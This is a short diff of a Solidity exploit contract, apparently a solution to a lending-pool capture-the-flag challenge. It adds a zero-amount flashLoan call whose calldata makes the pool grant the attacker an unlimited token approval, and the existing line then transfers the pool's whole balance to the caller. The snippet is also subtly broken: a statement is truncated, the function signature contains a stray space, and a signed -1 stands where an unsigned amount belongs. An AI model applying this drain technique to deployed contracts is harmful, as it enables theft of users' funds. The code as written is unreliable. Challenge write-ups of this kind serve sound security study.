@@ -46,6 +46,8 @@ contract TrusterExploit {
         TrusterLenderPool pool = TrusterLenderPool(_pool);
         IERC20 token = IERC20(_token);
             "approve(address, uint256)", address(this), int(-1)
+        );
+        pool.flashLoan(0, msg.sender, _token, data);
 
         token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
     }
